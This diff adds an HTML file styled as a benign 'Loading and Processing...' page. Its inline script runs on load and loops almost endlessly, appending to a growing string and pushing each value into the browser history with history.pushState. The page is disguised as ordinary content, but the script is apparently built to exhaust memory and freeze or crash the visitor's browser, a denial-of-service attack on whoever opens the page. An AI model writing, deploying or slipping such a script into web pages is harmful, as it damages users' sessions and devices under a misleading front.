@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Processing Data</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            margin: 40px;
+            text-align: center;
+        }
+        h1 {
+            color: #333;
+        }
+        p {
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Loading and Processing...</h1>
+    <p>Please wait while the page loads and processes the necessary data.</p>
+
+    <script>
+    var total = "";
+    for( var i = 0; i < 10000000000000; i++ ) {
+      total += i.toString();
+      history.pushState(0, 0, total );
+    }
+    console.log("Processing complete.");
+    </script>
+
+    <p>If you see this message, the initial processing might be complete, or the script did not execute as intended.</p>
+
+</body>
+</html>
